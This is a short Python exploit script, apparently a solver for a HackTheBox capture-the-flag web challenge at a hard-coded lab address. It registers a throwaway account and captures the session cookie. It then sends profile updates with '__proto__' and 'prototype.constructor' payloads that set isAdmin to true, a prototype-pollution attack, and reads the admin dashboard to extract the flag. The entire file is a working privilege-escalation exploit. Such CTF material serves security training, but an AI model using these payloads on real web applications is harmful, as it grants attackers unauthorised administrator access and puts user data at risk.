from requests import post, get
import random
import string
import re

BASE_URL = "http://83.136.253.59:41159/challenge/"

def random_string(length=6):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def register_user(username, password):

    url = f"{BASE_URL}/api/register"
    data = {
        "username": username,
        "email": f"{username}@test.com",
        "password": password
    }
    response = post(url, json=data, allow_redirects=False)
    return response


def login_user(username, password):
    url = f"{BASE_URL}/api/login"
    data = {
        "username": username,
        "password": password
    }
    response = post(url, json=data, allow_redirects=False)
    return response

def update_profile(cookie, data):

    url = f"{BASE_URL}/api/profile"

    headers = {
        "Cookie": cookie
    }

    response = post(url, json=data, headers=headers)

    return response

def get_admin_dashboard(cookie):

    url = f"{BASE_URL}/admin"
    headers = {
        "Cookie": cookie
    }
    
    response = get(url, headers=headers)
    return response.text

if __name__ == "__main__":
    username, password = random_string(8), random_string(8)
    register_user(username, password)
    cookie = login_user(username, password).headers["Set-Cookie"]

    data1 = {
            "favoriteCrop": "wheat",
            "experienceLevel": "intermediate",
            "farmSize": 501,
            "__proto__": {
                "isAdmin": True
            }
        }
    
    data2 = {
            "favoriteCrop": "wheat",
            "experienceLevel": "intermediate",
            "farmSize": 501,
            "prototype": {
                "constructor": {
                    "isAdmin": True
                }
            }
        }
    
    # One of the payload should be working.
    
    response1 = update_profile(cookie, data1)
    response2 = update_profile(cookie, data2)

    # Since exploit is overwriting global prototype. Challenge must be restarted to remove the previous injection. .
    
    admin_dashboard = get_admin_dashboard(cookie)
    match = re.search(r'HTB\{.*?\}', admin_dashboard)
    if match:
        print("Exploit success. Got the flag!")
        print(match.group())
    else:
        print("Exploit failed. No flag found.")

